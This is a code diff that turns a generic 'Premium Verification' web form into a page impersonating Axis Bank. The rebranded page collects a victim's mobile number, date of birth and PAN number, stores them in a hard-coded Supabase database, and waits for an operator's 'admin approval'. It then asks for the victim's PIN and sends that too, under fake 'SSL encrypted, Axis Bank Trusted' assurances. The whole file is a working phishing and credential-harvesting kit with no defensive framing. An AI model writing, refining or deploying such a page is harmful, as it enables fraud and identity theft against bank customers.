@@ -1,523 +1,382 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Premium Verification</title>
-
-<script src="https://unpkg.com/@supabase/supabase-js@2"></script>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-<style>
-
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Poppins',sans-serif;
-}
-
-body{
-    min-height:100vh;
-    background:#0f0f0f;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    overflow:hidden;
-    padding:20px;
-}
-
-.bg1{
-    position:absolute;
-    width:400px;
-    height:400px;
-    background:#ff0080;
-    filter:blur(180px);
-    top:-100px;
-    left:-100px;
-    opacity:0.4;
-}
-
-.bg2{
-    position:absolute;
-    width:400px;
-    height:400px;
-    background:#7928ca;
-    filter:blur(180px);
-    bottom:-100px;
-    right:-100px;
-    opacity:0.4;
-}
-
-.box{
-    width:420px;
-    background:rgba(255,255,255,0.06);
-    border:1px solid rgba(255,255,255,0.1);
-    backdrop-filter:blur(20px);
-    padding:35px;
-    border-radius:30px;
-    position:relative;
-    z-index:10;
-    box-shadow:0 20px 60px rgba(0,0,0,0.5);
-}
-
-h2{
-    text-align:center;
-    color:white;
-    margin-bottom:30px;
-    font-size:32px;
-    font-weight:700;
-}
-
-input{
-    width:100%;
-    padding:15px;
-    margin-bottom:18px;
-    border:none;
-    outline:none;
-    border-radius:14px;
-    background:rgba(255,255,255,0.08);
-    color:white;
-    font-size:15px;
-}
-
-input::placeholder{
-    color:#bbb;
-}
-
-button{
-    width:100%;
-    padding:15px;
-    border:none;
-    border-radius:14px;
-    background:linear-gradient(135deg,#ff0080,#7928ca);
-    color:white;
-    font-size:16px;
-    font-weight:600;
-    cursor:pointer;
-    transition:0.3s;
-}
-
-button:hover{
-    transform:translateY(-2px);
-}
-
-#status{
-    margin-top:25px;
-    text-align:center;
-    color:white;
-}
-
-.wait{
-    color:#ffd166;
-    font-weight:600;
-}
-
-.reject{
-    color:#ff4d6d;
-    font-size:22px;
-    font-weight:700;
-}
-
-.success{
-    color:#00ff95;
-    font-size:30px;
-    font-weight:700;
-}
-
-.loader{
-    width:45px;
-    height:45px;
-    border:4px solid rgba(255,255,255,0.2);
-    border-top:4px solid #ff0080;
-    border-radius:50%;
-    margin:15px auto;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    100%{
-        transform:rotate(360deg);
-    }
-}
-
-</style>
-
-</head>
-
-<body>
-
-<div class="bg1"></div>
-<div class="bg2"></div>
-
-<div class="box">
-
-<h2>Premium Verification</h2>
-
-<input type="text"
-id="number1"
-placeholder="Enter Number 1">
-
-<input type="month"
-id="date_value">
-
-<input type="text"
-id="number2"
-placeholder="Enter Number 2">
-
-<button onclick="submitForm()">
-Continue
-</button>
-
-<div id="status"></div>
-
-</div>
-
-<script>
-
-// ======================
-// SUPABASE
-// ======================
-
-const SUPABASE_URL =
-'https://ijvtokyhuqrwndyfxzrn.supabase.co';
-
-const SUPABASE_KEY =
-'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
-
-const client = window.supabase.createClient(
-    SUPABASE_URL,
-    SUPABASE_KEY
-);
-
-let currentId = null;
-let interval = null;
-
-
-// ======================
-// SUBMIT FORM
-// ======================
-
-async function submitForm(){
-
-    const number1 =
-    document.getElementById('number1').value;
-
-    const date_value =
-    document.getElementById('date_value').value;
-
-    const number2 =
-    document.getElementById('number2').value;
-
-
-    // VALIDATION
-    if(!number1 || !date_value || !number2){
-
-        alert('Please Fill All Fields');
-
-        return;
-    }
-
-
-    // LOADING
-    document.getElementById('status').innerHTML = `
-
-    <div class="loader"></div>
-
-    <div class="wait">
-    Submitting Request...
-    </div>
-
-    `;
-
-
-    // INSERT
-    const { data, error } = await client
-    .from('requests')
-    .insert([
-        {
-            number1:number1,
-            date_value:date_value,
-            number2:number2,
-            status:'pending',
-            pin:'',
-            pin_status:'waiting'
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank - Premium Verification</title>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    ])
-    .select();
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0a1428 0%, #001233 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+        }
 
+        .container {
+            width: 100%;
+            max-width: 460px;
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            overflow: hidden;
+        }
 
-    // ERROR
-    if(error){
+        .header {
+            background: linear-gradient(135deg, #003087, #002366);
+            color: white;
+            padding: 32px 25px;
+            text-align: center;
+            position: relative;
+        }
 
-        console.log(error);
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, #ffcc00, #ffd633);
+        }
 
-        document.getElementById('status').innerHTML = `
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 12px;
+        }
 
-        <div class="reject">
-        Error Submitting Form
+        .logo-circle {
+            background: white;
+            color: #003087;
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 30px;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+        }
+
+        .logo-text {
+            font-size: 36px;
+            font-weight: 700;
+            letter-spacing: -2px;
+        }
+
+        .content {
+            padding: 35px 28px;
+        }
+
+        h2 {
+            text-align: center;
+            color: white;
+            font-size: 28px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #a0b4ff;
+            font-size: 15.5px;
+            margin-bottom: 32px;
+        }
+
+        .inputBox {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #c0d0ff;
+            font-size: 14.5px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1.5px solid rgba(255,255,255,0.15);
+            border-radius: 12px;
+            background: rgba(255,255,255,0.07);
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.15);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #ff0080, #7928ca);
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(255, 0, 128, 0.4);
+        }
+
+        #status {
+            margin-top: 25px;
+            min-height: 80px;
+        }
+
+        .wait {
+            color: #ffd166;
+            font-weight: 600;
+        }
+
+        .reject {
+            color: #ff4d6d;
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .success {
+            color: #00ff95;
+            font-size: 30px;
+            font-weight: 700;
+        }
+
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top: 4px solid #ffcc00;
+            border-radius: 50%;
+            margin: 15px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .secure {
+            text-align: center;
+            margin-top: 20px;
+            color: #88aaff;
+            font-size: 13.5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-circle">A</div>
+                <div class="logo-text">axis</div>
+            </div>
+            <p style="font-size:15px; opacity:0.9;">Premium Verification System</p>
         </div>
 
-        `;
+        <div class="content">
+            <h2>Secure Verification</h2>
+            <p class="subtitle">Instant approval in few seconds</p>
 
-        return;
-    }
+            <div class="inputBox">
+                <label>Mobile Number</label>
+                <input type="text" id="number1" placeholder="Enter 10-digit mobile number" maxlength="10">
+            </div>
 
+            <div class="inputBox">
+                <label>Date of Birth</label>
+                <input type="month" id="date_value">
+            </div>
 
-    // SAVE ID
-    currentId = data[0].id;
+            <div class="inputBox">
+                <label>PAN Number</label>
+                <input type="text" id="number2" placeholder="Enter PAN Number" maxlength="10" style="text-transform:uppercase">
+            </div>
 
+            <button onclick="submitForm()">Continue Securely</button>
 
-    // START STATUS CHECK
-    listenStatus();
+            <div class="secure">🔒 256-Bit SSL Encrypted • Axis Bank Trusted</div>
+        </div>
 
-}
+        <div id="status"></div>
+    </div>
 
+    <script>
+    // ======================
+    // SUPABASE CONFIG
+    // ======================
+    const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
+    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
+    let currentId = null;
+    let interval = null;
 
-// ======================
-// REALTIME STATUS
-// ======================
+    // ======================
+    // SUBMIT FORM
+    // ======================
+    async function submitForm(){
+        const number1 = document.getElementById('number1').value;
+        const date_value = document.getElementById('date_value').value;
+        const number2 = document.getElementById('number2').value;
 
-function listenStatus(){
-
-    clearInterval(interval);
-
-    interval = setInterval(async()=>{
-
-        const { data, error } = await client
-        .from('requests')
-        .select('*')
-        .eq('id',currentId)
-        .single();
-
-
-        if(error){
-
-            console.log(error);
-
+        if(!number1 || !date_value || !number2){
+            alert('Please Fill All Fields');
             return;
         }
 
-
-        const statusDiv =
-        document.getElementById('status');
-
-
-
-        // ======================
-        // WAITING ADMIN
-        // ======================
-
-        if(data.status === 'pending'){
-
-            if(!statusDiv.innerHTML.includes('Waiting For Admin')){
-
-                statusDiv.innerHTML = `
-
-                <div class="loader"></div>
-
-                <div class="wait">
-                Waiting For Admin Approval...
-                </div>
-
-                `;
-
-            }
-
-        }
-
-
-
-        // ======================
-        // REJECTED
-        // ======================
-
-        else if(data.status === 'rejected'){
-
-            clearInterval(interval);
-
-            statusDiv.innerHTML = `
-
-            <div class="reject">
-            Request Rejected
-            </div>
-
-            `;
-
-        }
-
-
-
-        // ======================
-        // ACCEPTED
-        // ======================
-
-        else if(data.status === 'accepted'){
-
-
-            // ======================
-            // ENTER PIN
-            // ======================
-
-            if(data.pin_status === 'waiting'){
-
-                // AGAR PIN INPUT HAI
-                // TO RELOAD MAT KARO
-
-                if(!document.getElementById('pin')){
-
-                    statusDiv.innerHTML = `
-
-                    <input
-                    type="text"
-                    id="pin"
-                    placeholder="Enter PIN">
-
-                    <button onclick="submitPin()">
-                    Submit PIN
-                    </button>
-
-                    `;
-
-                }
-
-            }
-
-
-
-            // ======================
-            // PIN PENDING
-            // ======================
-
-            else if(data.pin_status === 'pending'){
-
-                if(!statusDiv.innerHTML.includes('Waiting For PIN')){
-
-                    statusDiv.innerHTML = `
-
-                    <div class="loader"></div>
-
-                    <div class="wait">
-                    Waiting For PIN Approval...
-                    </div>
-
-                    `;
-
-                }
-
-            }
-
-
-
-            // ======================
-            // PIN REJECTED
-            // ======================
-
-            else if(data.pin_status === 'rejected'){
-
-                clearInterval(interval);
-
-                statusDiv.innerHTML = `
-
-                <div class="reject">
-                PIN Rejected
-                </div>
-
-                `;
-
-            }
-
-
-
-            // ======================
-            // SUCCESS
-            // ======================
-
-            else if(data.pin_status === 'accepted'){
-
-                clearInterval(interval);
-
-                statusDiv.innerHTML = `
-
-                <div class="success">
-                Congratulations 🎉
-                </div>
-
-                `;
-
-            }
-
-        }
-
-    },2000);
-
-}
-
-
-
-// ======================
-// SUBMIT PIN
-// ======================
-
-async function submitPin(){
-
-    const pin =
-    document.getElementById('pin').value;
-
-
-    // VALIDATION
-    if(!pin){
-
-        alert('Enter PIN');
-
-        return;
-    }
-
-
-    // LOADING
-    document.getElementById('status').innerHTML = `
-
-    <div class="loader"></div>
-
-    <div class="wait">
-    Submitting PIN...
-    </div>
-
-    `;
-
-
-    // UPDATE PIN
-    const { error } = await client
-    .from('requests')
-    .update({
-        pin:pin,
-        pin_status:'pending'
-    })
-    .eq('id',currentId);
-
-
-    if(error){
-
-        console.log(error);
-
         document.getElementById('status').innerHTML = `
-
-        <div class="reject">
-        Error Submitting PIN
-        </div>
-
+            <div class="loader"></div>
+            <div class="wait">Submitting Request...</div>
         `;
 
+        const { data, error } = await client
+            .from('requests')
+            .insert([
+                {
+                    number1: number1,
+                    date_value: date_value,
+                    number2: number2,
+                    status: 'pending',
+                    pin: '',
+                    pin_status: 'waiting'
+                }
+            ])
+            .select();
+
+        if(error){
+            console.log(error);
+            document.getElementById('status').innerHTML = `
+                <div class="reject">Error Submitting Form</div>
+            `;
+            return;
+        }
+
+        currentId = data[0].id;
+        listenStatus();
     }
 
-}
+    // ======================
+    // REALTIME STATUS
+    // ======================
+    function listenStatus(){
+        clearInterval(interval);
+        interval = setInterval(async () => {
+            const { data, error } = await client
+                .from('requests')
+                .select('*')
+                .eq('id', currentId)
+                .single();
 
-</script>
+            if(error){
+                console.log(error);
+                return;
+            }
 
+            const statusDiv = document.getElementById('status');
+
+            if(data.status === 'pending'){
+                if(!statusDiv.innerHTML.includes('Waiting For Admin')){
+                    statusDiv.innerHTML = `
+                        <div class="loader"></div>
+                        <div class="wait">Waiting For Admin Approval...</div>
+                    `;
+                }
+            }
+            else if(data.status === 'rejected'){
+                clearInterval(interval);
+                statusDiv.innerHTML = `<div class="reject">Request Rejected</div>`;
+            }
+            else if(data.status === 'accepted'){
+                if(data.pin_status === 'waiting'){
+                    if(!document.getElementById('pin')){
+                        statusDiv.innerHTML = `
+                            <input type="text" id="pin" placeholder="Enter PIN" style="margin-bottom:15px;">
+                            <button onclick="submitPin()">Submit PIN</button>
+                        `;
+                    }
+                }
+                else if(data.pin_status === 'pending'){
+                    if(!statusDiv.innerHTML.includes('Waiting For PIN')){
+                        statusDiv.innerHTML = `
+                            <div class="loader"></div>
+                            <div class="wait">Waiting For PIN Approval...</div>
+                        `;
+                    }
+                }
+                else if(data.pin_status === 'rejected'){
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<div class="reject">PIN Rejected</div>`;
+                }
+                else if(data.pin_status === 'accepted'){
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `
+                        <div class="success">Congratulations 🎉<br>Verified Successfully</div>
+                    `;
+                }
+            }
+        }, 2000);
+    }
+
+    // ======================
+    // SUBMIT PIN
+    // ======================
+    async function submitPin(){
+        const pin = document.getElementById('pin').value;
+        if(!pin){
+            alert('Enter PIN');
+            return;
+        }
+
+        document.getElementById('status').innerHTML = `
+            <div class="loader"></div>
+            <div class="wait">Submitting PIN...</div>
+        `;
+
+        const { error } = await client
+            .from('requests')
+            .update({
+                pin: pin,
+                pin_status: 'pending'
+            })
+            .eq('id', currentId);
+
+        if(error){
+            console.log(error);
+            document.getElementById('status').innerHTML = `
+                <div class="reject">Error Submitting PIN</div>
+            `;
+        }
+    }
+    </script>
 </body>
 </html>
